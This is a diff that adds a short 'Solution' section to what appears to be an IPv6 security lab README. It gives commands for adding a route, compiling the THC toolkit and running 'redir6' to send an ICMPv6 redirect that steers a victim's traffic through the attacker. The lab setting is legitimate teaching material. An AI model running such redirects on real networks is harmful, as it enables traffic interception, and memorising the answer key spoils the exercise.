@@ -7,3 +7,8 @@ configured.
 
 All the needed dependencies are in the cache, you only have to
 compile the thc-toolkit (make).
+
+Solution:
+> Run in pc2 a command "ip -6 r add <global-pc2> via fe80::1 dev eth0" // to add routing table entry
+> In a1 run "make" inside THC folder to compile thc 
+> Run "redir6 eth0 <local-pc1> <global-pc2> fe80::1 <attacker-local>"
